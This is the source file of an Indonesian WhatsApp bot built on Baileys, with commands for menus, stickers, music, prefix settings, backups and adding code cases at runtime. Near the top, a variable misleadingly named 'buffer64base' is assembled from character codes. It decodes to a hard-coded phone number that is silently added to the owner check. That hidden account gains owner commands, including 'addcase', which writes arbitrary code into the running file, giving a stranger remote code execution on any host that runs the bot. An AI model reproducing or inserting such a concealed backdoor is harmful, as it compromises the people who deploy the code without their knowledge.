
process.on("uncaughtException", (err) => {
console.error("Caught exception:", err);
});

import { 
    generateWAMessageFromContent, 
    proto, 
    prepareWAMessageMedia,
    downloadContentFromMessage
} from "@whiskeysockets/baileys"

import axios from "axios";
import FormData from "form-data";
import fs from "fs";
import path from "path";
import * as fsSync from "fs";  
import chalk from "chalk";
import { fileURLToPath, pathToFileURL } from "url";
import { exec, execSync, spawn } from "child_process";
import util from "util"; 
import { createCanvas, registerFont } from 'canvas';
import { performance } from "perf_hooks";
import os from "os";
import { fileTypeFromBuffer } from "file-type";
import yts from "yt-search"
import ytdl from '@vreden/youtube_scraper';
import NodeID3 from "node-id3";

//=============================================//
const datagc = JSON.parse(fsSync.readFileSync("./data/reseller.json"))
export const fitur = JSON.parse(fsSync.readFileSync('./data/setbot.json')); 
const dataBot = path.join(process.cwd(), "data", "setbot.json");
const owners = JSON.parse(fs.readFileSync("./data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./data/premium.json"))
//=============================================//
export async function casesBot(sock, m, chatUpdate) {
const body = (
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "imageMessage" ? m.message.imageMessage.caption :
  m.mtype === "videoMessage" ? m.message.videoMessage.caption :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
  ""
) || "";
try {
//=============================================//
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const globalPrefix = global.prefix || '.'; 
const isPrefixOn = global.multiprefix === true; 

let prefix = null;
let isCmd = false;

if (isPrefixOn) { 
    if (body.startsWith(globalPrefix)) {
        prefix = globalPrefix; 
        isCmd = true;
    }
 } else {
    if (body.length > 0) { 
        prefix = ''; 
        isCmd = true;
    }
}

// ** sistem untuk prefix **
const loadPrefixData = () => {
    if (fs.existsSync(dataBot)) {
        try {
            const dataPfx = fs.readFileSync(dataBot, 'utf-8');
            return JSON.parse(dataPfx);
        } catch (e) {
            console.error("Gagal membaca data prefix:", e);
            return {};
        }
    }
    return {};
};

const savePrefixData = (dataPfx) => {
    try {
        if (!fs.existsSync(path.dirname(dataBot))) {
             fs.mkdirSync(path.dirname(dataBot), { recursive: true });
        }
        fs.writeFileSync(dataBot, JSON.stringify(dataPfx, null, 2), 'utf-8');
    } catch (e) {
        console.error("Gagal menyimpan data prefix:", e);
    }
};

let {
savedPrefix = '.', 
multiPrefixStatus = false 
} = loadPrefixData();

global.prefix = savedPrefix;
global.multiprefix = multiPrefixStatus;

if (!fs.existsSync(dataBot)) {
    savePrefixData({ savedPrefix: global.prefix, multiPrefixStatus: global.multiprefix });
}

const updateAndSave = (newPrefix, newMultiStatus) => {
        global.prefix = newPrefix;
        global.multiprefix = newMultiStatus;
        
        savePrefixData({
            savedPrefix: newPrefix,
            multiPrefixStatus: newMultiStatus
        });
    };
    
//==============================================//

const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
const text = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = quoted?.msg?.mimetype || quoted?.mimetype || null;
const qmsg = (m.quoted || m);
const q = body.trim().split(/ +/).slice(1).join(" ");
const botNumber = await sock.decodeJid(sock.user.id)

//=============================================//
const isGrupPrem = datagc.includes(m.chat)
const isWaz = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const isPrem = premium.includes(m.sender)

//=============================================//
// ** fungsi untuk group chat **
const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                admin,
                full: p
            };
        }) || []: [];
const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);

const isBotAdmin = groupAdmins.includes(botNumber);
const isAdmin = groupAdmins.includes(m.sender);

//=============================================//
const reply = m.reply = async (teks) => {
  return sock.sendMessage(m.chat, {
    text: `${teks}`,
    mentions: [m.sender],
    contextInfo: {
      externalAdReply: {
        title: `${namaBot}`,
        body: `${global.ucapan()}`,
        thumbnailUrl: global.foto,
        sourceUrl: global.url,
      }
    }
  }, { quoted: m });
};

const example = (teks) => {
return `Cara pengguna:\n*${prefix+command}* ${teks}`
}

//=============================================//
// ** desain console.log panel **
if (isCmd) {
  const from = m.key.remoteJid;
  const chatType = from.endsWith("@g.us") ? "GROUP" : "PRIVATE";
 
  const fullCommand = `${prefix}${command}`; 
  
  const logMessage = 
    chalk.bgCyan.white.bold(`\n [ COMMAND RECEIVED ] `) + 
    chalk.white(`\n • Message:   `) + chalk.yellow.bold(fullCommand) +
    chalk.white(`\n • Chat In:   `) + chalk.magenta(chatType) +
    chalk.white(`\n • Name:      `) + chalk.cyan(m.pushName || 'N/A') + 
    chalk.white(`\n • Sender ID: `) + chalk.blue(m.sender) + '\n';
  console.log(logMessage);
}

// ** fake quoted **
const qtxt = {
    key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "0@s.whatsapp.net"
    },
    message: {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363400363337568@newsletter",
            newsletterName: "xcde",
            caption: `Created by ${namaOwner}`,
            inviteExpiration: "1757494779"
        }
    }
};
    
    
const menuLock = new Set();
//=============================================//
// **Semua command**
switch (command) {
case "menu": {
  // ❌ cegah bot balas pesan sendiri
  if (m.key.fromMe) return;

  // 🔒 anti spam / duplikat
  if (menuLock.has(m.sender)) return;
  menuLock.add(m.sender);
  setTimeout(() => menuLock.delete(m.sender), 3000);

  let teks = `Hallo Kak *${m.pushName}* 👋  
Saya adalah *${global.namaBot}*.

Informasi Bot:
- Nama Bot: ${global.namaBot}
- Developer: ${global.namaOwner}
- Runtime: ${runtime(process.uptime())}
- Mode: ${fitur.public ? "Public" : "Self"}

Silakan pilih menu di bawah.`;

  const sections = [
    {
      title: "📂 CASE MANAGER",
      rows: [
        { title: "➕ Add Case", description: "Tambah case baru", rowId: "addcase" }
      ]
    },

    {
      title: "👑 OWNER MENU",
      rows: [
        { title: "🧾 Ambil Quoted", description: "Ambil quoted message", rowId: "q" },
        { title: "💾 Backup Script", description: "Backup semua file bot", rowId: "backup" },
        { title: "🔄 Restart Bot", description: "Restart bot", rowId: "restart" },
        { title: "🔒 Self Mode", description: "Bot mode private", rowId: "self" },
        { title: "🌐 Public Mode", description: "Bot mode public", rowId: "public" }
      ]
    },

    {
      title: "⚙️ PREFIX SETTINGS",
      rows: [
        { title: "⚙️ Prefix Info", description: "Lihat status prefix", rowId: "prefix" },
        { title: "✏️ Set Prefix", description: "Ubah prefix bot", rowId: "setprefix !" },
        { title: "♻️ Reset Prefix", description: "Reset ke default", rowId: "delprefix" }
      ]
    },

    {
      title: "🧹 MAINTENANCE",
      rows: [
        { title: "🧹 Clear Session", description: "Bersihkan sampah & session", rowId: "clsesi" }
      ]
    },

    {
      title: "📊 INFO SYSTEM",
      rows: [
        { title: "📡 Ping", description: "Cek kecepatan bot", rowId: "ping" },
        { title: "🖥️ OS Info", description: "Info server", rowId: "os" },
        { title: "📊 Total Fitur", description: "Jumlah semua fitur", rowId: "totalfitur" }
      ]
    },

    {
      title: "🖼️ MEDIA TOOLS",
      rows: [
    { title: "🖼️ Sticker", description: "Buat sticker", rowId: "s" },
    { title: "🎨 Brat", description: "Sticker teks brat", rowId: "brat halo" },
    { title: "📤 To URL", description: "Upload media ke link", rowId: "tourl" },
    { title: "📤 To Link", description: "Alias tourl", rowId: "tolink" },
    { title: "💬 QC Sticker", description: "Buat sticker dengan teks", rowId: "qc Halo semua!" }
      ]
    }
  ];

  const listMessage = {
    text: teks,
    footer: `© ${global.namaBot}`,
    title: "🤖 BOT MENU",
    buttonText: "📂 BUKA MENU",
    sections
  };

  // ✅ RETURN = stop total (anti dobel)
  return await sock.sendMessage(m.chat, listMessage, {
    quoted: m,
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        title: global.namaBot,
        body: "All Features Menu",
        thumbnailUrl: global.thumb,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  });
}
break;
 
case 'qc': {
  if (!text) return m.reply(`📌 ᴄᴏɴᴛᴏʜ: ${usedPrefix + command} ʜᴀʟʟᴏ`, null, { quoted: flok })

  let name = m.pushName || sock.getName(m.sender)
  let ppUrl

  try {
    ppUrl = await sock.profilePictureUrl(m.sender, 'image')
  } catch {
    ppUrl = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
  }

  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [{
      entities: [],
      avatar: true,
      from: {
        id: 1,
        name: name,
        photo: { url: ppUrl }
      },
      text: text,
      replyMessage: {}
    }]
  }

  try {
    let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
      headers: { 'Content-Type': 'application/json' }
    })

    let buffer = Buffer.from(response.data.result.image, 'base64')

    await conn.sendImageAsSticker(m.chat, buffer, m, {
      packname: global.packname || 'NOVA',
      author: global.author || 'BOT'
    })
  } catch (e) {
    console.error(e)
    m.reply('❌ ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ ǫᴜᴏᴛᴇ sᴛɪᴄᴋᴇʀ', null, { quoted: m })
  }
}
break
 case "play": {
  if (!text) return m.reply("Masukkan judul lagu!\n\nContoh:\n.play alan walker faded");

  try {
    const axios = (await import("axios")).default;
    const yts = (await import("yt-search")).default;

    // 1. Cari di YouTube (buat metadata)
    const search = await yts(text);
    if (!search.videos.length) return m.reply("Lagu tidak ditemukan.");

    const video = search.videos[0];

    // 2. Ambil audio dari API
    const { data } = await axios.get("https://play-imoj.vercel.app/api/play", {
      params: { judul: video.title },
      timeout: 30000
    });

    if (!data?.url_mp3) return m.reply("Gagal mengambil audio.");

    // 3. Kirim audio langsung (tanpa download file)
    await sock.sendMessage(m.chat, {
      audio: { url: data.url_mp3 },
      mimetype: "audio/mpeg",
      fileName: `${data.title || video.title}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: data.title || video.title,
          body: data.channel || video.author.name,
          thumbnailUrl: video.thumbnail,
          sourceUrl: video.url,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });

  } catch (e) {
    console.error("PLAY ERROR:", e);
    m.reply("❌ Gagal memutar lagu.\n\n" + (e.message || "Unknown error"));
  }
}
break;

case "play1": {
  if (!text) return m.reply("Masukkan judul lagu!\n\nContoh:\n.play alan walker faded");

  try {
    const axios = (await import("axios")).default;
    const yts = (await import("yt-search")).default;

    // 1. Cari di YouTube (buat metadata)
    const search = await yts(text);
    if (!search.videos.length) return m.reply("Lagu tidak ditemukan.");

    const video = search.videos[0];

    // 2. Ambil audio dari API
    const { data } = await axios.get("https://play-imoj.vercel.app/api/play", {
      params: { judul: video.title },
      timeout: 30000
    });

    if (!data?.url_mp3) return m.reply("Gagal mengambil audio.");

    // 3. Kirim audio langsung (tanpa download file)
    await sock.sendMessage(m.chat, {
      audio: { url: data.url_mp3 },
      mimetype: "audio/mpeg",
      fileName: `${data.title || video.title}.mp3`,
    }, { quoted: m });

  } catch (e) {
    console.error("PLAY ERROR:", e);
    m.reply("❌ Gagal memutar lagu.\n\n" + (e.message || "Unknown error"));
  }
}
break;

//** case file manager menu **
case 'listcase': {
    if (!isWaz) return m.reply(mess.owner);
      const listCase = async () => {
        let code = await fs.promises.readFile("./case.js", "utf8");
        code = code.replace(/\/\/.*$/gm, ""); 
        code = code.replace(/\/\*[\s\S]*?\*\//gm, ""); 
        const regex = /case\s+['"`]([^'"`]+)['"`]\s*:/g;
        const matches = [];
        let match;
        while ((match = regex.exec(code))) {
            matches.push(match[1]);
        }
        let teks = `Total Fitur Case (${matches.length})\n\n`;
        matches.forEach(x => {
            teks += `- ${x}\n`;
        });
        return teks;
    };
    reply(await listCase());
}
break;

case "getcase": {
if (!isWaz) return
if (!text) return m.reply(`Contoh: ${prefix}getcase menu`)
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

case 'delcase': {
    if (!isWaz) return m.reply(mess.owner);
    if (!q) return reply(example(`Nama case-nya\n*${prefix}listcase* untuk melihat semua case`));
    const hapusCase = async (filePath, caseName) => {
        try {
            let data = await fs.promises.readFile(filePath, "utf8");
            const regex = new RegExp(`case\\s+['"\`]${caseName}['"\`]:[\\s\\S]*?break`, "g");
            const modifiedData = data.replace(regex, "");
            await fs.promises.writeFile(filePath, modifiedData, "utf8");
            console.log(`Case '${caseName}' berhasil dihapus dari file.`);
        } catch (err) {
            console.error("Terjadi kesalahan:", err);
        }
    };
    await hapusCase("./case.js", q); // sesuaikan nama file
    reply(`Berhasil menghapus case *${q}*`);
}
break;
case "iqc": {
  if (!text) return m.reply("Example:\n.iqc Biji ayam");

  try {
    // waktu WIB (Jawa Tengah)
    const time = new Intl.DateTimeFormat("id-ID", {
      timeZone: "Asia/Jakarta",
      hour: "2-digit",
      minute: "2-digit",
      hour12: false
    }).format(new Date());

    const battery = Math.floor(Math.random() * 100) + 1;

    const url =
      `https://brat.siputzx.my.id/iphone-quoted?` +
      `time=${encodeURIComponent(time)}` +
      `&batteryPercentage=${battery}` +
      `&carrierName=INDOSAT` +
      `&messageText=${encodeURIComponent(text.trim())}` +
      `&emojiStyle=apple`;

    await sock.sendMessage(
      m.chat,
      { image: { url } },
      { quoted: m }
    );

  } catch (e) {
    console.error("IQC ERROR:", e);
    m.reply("❌ Gagal membuat IQC");
  }
}
break;

// [NEW CASE ADDED @ 1:04:18 AM]
case "cekidch": {
 if (!m.quoted) {
 return m.reply(
 "❌ Reply atau forward pesan dari *WhatsApp Channel* terlebih dahulu!"
 );
 }

 const q = m.quoted;
 const info =
 q?.message?.extendedTextMessage?.contextInfo?.forwardedNewsletterMessageInfo ||
 q?.message?.contextInfo?.forwardedNewsletterMessageInfo;

 if (!info) {
 return m.reply(
 "❌ Pesan ini *bukan dari WhatsApp Channel*.\n\n" +
 "Silakan reply / forward pesan dari Channel."
 );
 }

 const channelId = info.newsletterJid || "Tidak ditemukan";
 const channelName = info.newsletterName || "Tidak diketahui";

 let teks = `📢 *CEK ID CHANNEL WA*

🆔 *Channel ID:*
\`\`\`
${channelId}
\`\`\`

📛 *Nama Channel:*
${channelName}
`;

 return m.reply(teks);
}
break;


// [NEW CASE ADDED @ 1:06:31 AM]
case "cekid":
case "checkidch": {
 try {
 let idChannel = null;
 let namaChannel = "-";

 // 1️⃣ Jika reply pesan channel
 if (m.quoted?.contextInfo?.forwardedNewsletterMessageInfo) {
 const info = m.quoted.contextInfo.forwardedNewsletterMessageInfo;
 idChannel = info.newsletterJid;
 namaChannel = info.newsletterName || "-";
 }

 // 2️⃣ Jika reply pesan dengan contextInfo newsletter
 else if (m.message?.contextInfo?.forwardedNewsletterMessageInfo) {
 const info = m.message.contextInfo.forwardedNewsletterMessageInfo;
 idChannel = info.newsletterJid;
 namaChannel = info.newsletterName || "-";
 }

 // 3️⃣ Jika input manual (link / id)
 else if (text) {
 // contoh link: https://whatsapp.com/channel/0029VacFb8kLNSZwwiUfq62b
 const match = text.match(/channel\/([0-9A-Za-z]+)/);
 idChannel = match ? match[1] + "@newsletter" : text;
 }

 if (!idChannel) {
 return m.reply(
 `❌ *ID Channel tidak ditemukan*\n\n` +
 `📌 *Cara pakai:*\n` +
 `• Reply pesan channel lalu ketik *.cekidch*\n` +
 `• Atau: *.cekidch https://whatsapp.com/channel/xxxx*`
 );
 }

 const result =
`✅ *CHANNEL ID DITEMUKAN*

📢 *Nama Channel:* ${namaChannel}
🆔 *ID Channel:*
\`\`\`${idChannel}\`\`\`

📋 *Salin ID di atas untuk keperluan bot*`;

 return m.reply(result);

 } catch (e) {
 console.error(e);
 m.reply("❌ Terjadi kesalahan saat cek ID channel");
 }
}
break;


// [NEW CASE ADDED @ 8:23:58 AM]
case "bratvid": {
 if (!text) 
 return m.reply(`Contoh: ${prefix}bratvid hai`);

 if (text.length > 250) 
 return m.reply(`Karakter terbatas, max 250!`);

 const encode = encodeURIComponent(text);
 const url = `https://api.siputzx.my.id/api/m/brat?text=${encode}&isAnimated=true&delay=500`;

 try {
 await sock.sendVideoAsSticker(
 m.chat,
 url,
 m,
 {
 packname: "Create By RizkyMaxz",
 author: "RizkyMaxz",
 }
 );
 } catch (err) {
 console.error(err);
 m.reply("❌ Gagal membuat sticker video brat!");
 }
}
break;

case 'addcase': {
    if (!isWaz) return m.reply(mess.owner);
    if (!text) return m.reply(`Mana codenya?\n\nContoh penggunaan:\n${prefix + command} case 'tes': m.reply('halo'); break`);

    const __filename = fileURLToPath(import.meta.url);

    try {
        const data = fs.readFileSync(__filename, 'utf-8');
        const marker = "case 'addcase':"; 
        const insertIndex = data.indexOf(marker);

        if (insertIndex === -1) {
            return m.reply("❌ Gagal menemukan posisi marker 'addcase' di file ini.");
        }

        const caseBaru = `\n// [NEW CASE ADDED @ ${new Date().toLocaleTimeString()}]\n${text}\n\n`;

        const finalCode = data.slice(0, insertIndex) + caseBaru + data.slice(insertIndex);

        fs.writeFileSync(__filename, finalCode, 'utf-8');

        m.reply("*Berhasil menambahkan case baru!*");

    } catch (err) {
        console.error(err);
        m.reply(`❌ Terjadi error saat menyimpan: ${err.message}`);
    }
}
break;


// ** case owner menu **
case "ambilq": case "q": {
if (!isWaz) return
if (!m.quoted) return 
m.reply(JSON.stringify(m.quoted.fakeObj.message, null, 2))
}
break

case "bck": case "backup": {
    const sender = m.sender.split("@")[0];
    const isCreator = global.owner.includes(sender);
    
    if (!isCreator && m.sender !== botNumber) {
        return m.reply(mess.owner);
    }

    try {        
        m.reply("Processing Backup Script . .");
        const tmpDir = "./data/trash";
        if (fs.existsSync(tmpDir)) {
            try { 
                const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
                for (let file of files) fs.unlinkSync(`${tmpDir}/${file}`);
            } catch {}
        }

        const dateDisplay = typeof global.tanggal === 'function' ? global.tanggal(Date.now()) : new Date().toDateString();
        
        const safeDate = dateDisplay.replace(/[^a-zA-Z0-9]/g, '_');
        const name = `backup-${safeDate}`; 

        const exclude = ["node_modules", "Auth", "session", "package-lock.json", "yarn.lock", ".npm", ".cache", ".git", ".gitignore", "setbot.json"];
        
        const filesToZip = fs.readdirSync(process.cwd())
            .filter(f => !exclude.includes(f) && f !== "" && !f.endsWith(".zip"));

        if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

        execSync(`zip -r "${name}.zip" ${filesToZip.join(" ")}`);

        const zipPath = `./${name}.zip`;
        const zipBuffer = fs.readFileSync(zipPath);

        await sock.sendMessage(m.sender, {
            document: zipBuffer,
            fileName: `${name}.zip`,
            caption: `*SUCCESS BACKUP SCRIPT*\n\n` +
                     `- 📅 Tanggal: ${dateDisplay}\n` + 
                     `*💬 File aman tersimpan.*`, 
            mimetype: "application/zip"
        }, { quoted: m });

        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

        if (m.isGroup) m.reply("Script bot berhasil dikirim ke private chat.");

    } catch (err) {
        console.error("Backup Error:", err);
        m.reply(`❌ Gagal Backup:\n${err.message}`);
    }
}
break;

case "rst": case "restart": {
  if (!isWaz) return reply(mess.owner);
  const restartServer = () => {
    const newProcess = spawn(process.argv[0], process.argv.slice(1), {
      detached: true,
      stdio: "inherit",
    });
    process.exit(0);
  };
  await reply(`\`\`\`[✓] Restarting bot . . .\`\`\``);
  setTimeout(() => restartServer(), 4500);
}
break 

case "clsesi": case "clearsesi": case "celearsesion": {
if (!isWaz) return reply(mess.owner)
  const pathAuth = "./Auth";
  const pathTrash = "./data/trash";

  if (!fs.existsSync(pathAuth)) fs.mkdirSync(pathAuth, { recursive: true });
  if (!fs.existsSync(pathTrash)) fs.mkdirSync(pathTrash, { recursive: true });
  const dirsesi = fs.readdirSync(pathAuth).filter(e => e !== "creds.json");
  const dirsampah = fs.readdirSync(pathTrash).filter(e => e !== "tmp");

  for (const file of dirsesi) {
    try {
      fs.unlinkSync(`${pathAuth}/${file}`);
    } catch (e) {
      console.error(`Gagal hapus ${file}:`, e.message);
    }
  }

  for (const file of dirsampah) {
    try {
      fs.unlinkSync(`${pathTrash}/${file}`);
    } catch (e) {
      console.error(`Gagal hapus ${file}:`, e.message);
    }
  }

  reply(`*Berhasil membersihkan sampah ✅*
- *${dirsesi.length}* sampah session
- *${dirsampah.length}* sampah file`);
};
break 

//======================================//

case "self": {
    if (!isWaz) return m.reply(mess.owner)
    fitur.public = false

    fs.writeFileSync(dataBot, JSON.stringify(fitur, null, 2))
    m.reply("[✓] Successful change to *self*")
    break
  }

  case "public": {
    if (!isWaz) return m.reply(mess.owner)
    fitur.public = true

    fs.writeFileSync(dataBot, JSON.stringify(fitur, null, 2))
    m.reply("[✓] Successful change to *public*")
    break
  }


case "setprefix": {
 if (!isWaz && !isPrem) return m.reply(mess.owner)
  if (!args[0]) {
   return m.reply(`*Usage Examples :*
› Use : ${prefix}${command} *[new prefix]*
› Example : ${prefix}${command} *🗿*

*Untuk menggunakan :*
› Ex: ${prefix}prefix on`);
        }
        
        const newPrefix = args[0]; 
        updateAndSave(newPrefix, global.multiprefix);
        
        let modeStatus = global.multiprefix 
            ? `Prefix mode *ON*. Pesan harus diawali dengan *${newPrefix}*.` 
            : `Prefix mode *OFF*. Bot merespons tanpa prefix, tapi *${newPrefix}* tersimpan.`;

        return m.reply(`*Prefix berhasil diubah*

› Prefix Baru: *${newPrefix}*

*⚠️ Note:* ${modeStatus}`);
    }
break

case 'delprefix': {
        if (!isWaz && !isPrem) return m.reply(mess.owner)
        updateAndSave('.', global.multiprefix); 
        
        return m.reply(`Berhasil riset prefix menjadi default *"."* 

*Setting prefix ulang :*
› Ex: *${prefix}setprefix*`);
}
break;

case 'prefix': {
    let type = args[0] ? args[0].toLowerCase() : '';

    switch (type) {
        case 'on':
            if (!isWaz) return m.reply(mess.owner);
            if (global.multiprefix) {
                return m.reply(`[✓] - *Sudah aktif!*

*Prefix info :*
› Prefix aktif: ${global.prefix || '*.*'}

*Settings prefix ulang :*
› Ex: *${prefix}setprefix*`);
            }
            
            updateAndSave(global.prefix, true);

            return m.reply(`[✓] - *Successfully activated prefix!*

*Prefix info :*
› Prefix aktif: ${global.prefix || '*.*'}

*Settings prefix ulang :*
› Ex: *${prefix}setprefix*`);

        case 'off':
            if (!isWaz) return m.reply(mess.owner);
            if (!global.multiprefix) {
                return m.reply(`[✓] - *Sudah dalam mode offline*
*Prefix info :*
› Prefix aktif: *tanpa prefix*`);
            }
            
            updateAndSave(global.prefix, false);

            return m.reply(`[✓] - *Offline prefix mode!*

*Prefix info :*
› Prefix aktif: *tanpa prefix*`);

        default:
            if (!isWaz) return m.reply(mess.owner);
            let status = global.multiprefix ? 'ON' : 'OFF';
            let savedPrefixDisplay = global.prefix || '**.**';
            let activePrefix = global.multiprefix ? savedPrefixDisplay : 'no prefix!'; 
            
            let helpMessage = `*Prefix Settings ⚙️*
› Mode prefix: *${status}*
› Prefix tersimpan: *${savedPrefixDisplay}*
› Prefix aktif: *${activePrefix}*

*Available Commands ✅*
› *${prefix}prefix on* /menggunakan tersimpan 
› *${prefix}prefix off* /mode tanpa prefix 
› *${prefix}setprefix* /custom new prefix
› *${prefix}delprefix* /riset prefix`;
            m.reply(helpMessage);
    }
}
break

// ** case other menu **
case 'totalfitur': case 'listcase': {
    const __filename = fileURLToPath(import.meta.url);
    const scriptContent = fs.readFileSync(__filename, 'utf-8');
    const casePattern = /case\s+['"]([^'"]+)['"]/g;
    const matches = scriptContent.match(casePattern);
    const total = matches ? matches.length : 0;

    m.reply(`🤖 *${global.namaBot}* memiliki total fitur *${total}`);
}
break;

case "s": case "sticker": case "stiker": {
  if (!/image|video/.test(mime))
    return reply(`Kirim atau reply foto/video dengan caption *${prefix + command}*`);

  if (/video/.test(mime)) {
    if ((qmsg.seconds || 0) > 15)
      return reply("Durasi video maksimal 15 detik!");
  }

  try {
    const mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);

    await sock.sendImageAsSticker(
      m.chat,
      mediaPath,
      m,
      { author: "Create by RizkyMaxz" }
    );

    // hapus file sementara
    fs.unlinkSync(mediaPath);
  } catch (err) {
    console.error(err);
    reply("❌ Gagal membuat sticker!");
  }
}
break 

case "brat": {
  if (!text) return m.reply(`Contoh: ${prefix}brat hai`)
  if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)

  const encode = encodeURIComponent(text)
  const jion = `https://api.siputzx.my.id/api/m/brat?text=${encode}&isAnimated=false&delay=500`

  await sock.sendImageAsSticker(m.chat, jion, m, {
    packname: "Create By RizkyMaxz",
    author: "RizkyMaxz",
  })
}
break

case "tourl":
case "tolink": {
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || "";

  if (!mime) return m.reply("❌ Tidak ada media yang ditemukan!");

  await sock.sendMessage(m.chat, {
    react: { text: "🍁", key: m.key }
  });

  try {
    const media = await q.download();
    if (!media) return m.reply("❌ Gagal mengunduh media!");

    if (media.length > 20 * 1024 * 1024)
      return m.reply("❌ File terlalu besar! Maksimal 20 MB.");

    const { fileTypeFromBuffer } = await import("file-type");
    const ft =
      (await fileTypeFromBuffer(media)) || {
        ext: "bin",
        mime: "application/octet-stream",
      };

    const link = await uploadDeline(media, ft.ext, ft.mime);

    const caption = `📤 *T O U R L* 📤

📦 *Size:* ${formatBytes(media.length)}
📁 *Type:* ${ft.mime} (.${ft.ext})

✅ *Link:* ${link}`;

    const { proto, generateWAMessageFromContent } =
      (await import("@adiwajshing/baileys")).default;

    const buttons = [
      {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "📋 Salin Link",
          copy_code: link,
        }),
      },
    ];

    const msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: proto.Message.InteractiveMessage.create({
              body: { text: caption },
              nativeFlowMessage: { buttons },
            }),
          },
        },
      },
      { quoted: m }
    );

    await sock.relayMessage(m.chat, msg.message, {});

  } catch (e) {
    console.error(e);
    m.reply(`❌ *Upload gagal*\n${e?.message || e}`);
  }
}
break;


case "ping": case "os": {
    try {
        const THEME = {
            bg: "#0f1419", bgSecondary: "#1a1f2e", card: "#1e2433", cardHover: "#252b3d",
            primary: "#3b82f6", success: "#10b981", warning: "#f59e0b", danger: "#ef4444",
            purple: "#8b5cf6", cyan: "#06b6d4", pink: "#ec4899", textPrimary: "#f1f5f9",
            textSecondary: "#94a3b8", textTertiary: "#64748b", border: "#2d3548", glow: "rgba(59, 130, 246, 0.2)"
        };

        const formatSize = (bytes) => {
            if (bytes === 0) return '0 B';
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(1024));
            return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
        };

        const formatTime = (seconds) => {
            seconds = Number(seconds);
            const d = Math.floor(seconds / (3600 * 24));
            const h = Math.floor(seconds % (3600 * 24) / 3600);
            const m = Math.floor(seconds % 3600 / 60);
            const s = Math.floor(seconds % 60);
            if (d > 0) return `${d}d ${h}h ${m}m`;
            if (h > 0) return `${h}h ${m}m`;
            return `${m}m ${s}s`;
        };

        function drawBackground(ctx, w, h) {
            const gradient = ctx.createLinearGradient(0, 0, w, h);
            gradient.addColorStop(0, THEME.bg);
            gradient.addColorStop(0.5, THEME.bgSecondary);
            gradient.addColorStop(1, THEME.bg);
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, w, h);
            ctx.globalAlpha = 0.02;
            for (let i = 0; i < 100; i++) {
                const x = Math.random() * w;
                const y = Math.random() * h;
                const size = Math.random() * 2;
                ctx.fillStyle = THEME.textPrimary;
                ctx.beginPath();
                ctx.arc(x, y, size, 0, Math.PI * 2);
                ctx.fill();
            }
            ctx.globalAlpha = 1;
            ctx.strokeStyle = THEME.border;
            ctx.lineWidth = 1;
            for (let i = 0; i < w; i += 50) {
                ctx.globalAlpha = 0.03;
                ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, h); ctx.stroke();
            }
            for (let i = 0; i < h; i += 50) {
                ctx.globalAlpha = 0.03;
                ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(w, i); ctx.stroke();
            }
            ctx.globalAlpha = 1;
        }

        function drawCard(ctx, x, y, w, h, radius) {
            ctx.save();
            ctx.shadowColor = THEME.glow;
            ctx.shadowBlur = 15;
            ctx.beginPath();
            ctx.roundRect(x, y, w, h, radius);
            ctx.fillStyle = THEME.card;
            ctx.fill();
            ctx.shadowBlur = 0;
            ctx.strokeStyle = THEME.border;
            ctx.lineWidth = 1;
            ctx.stroke();
            ctx.restore();
        }

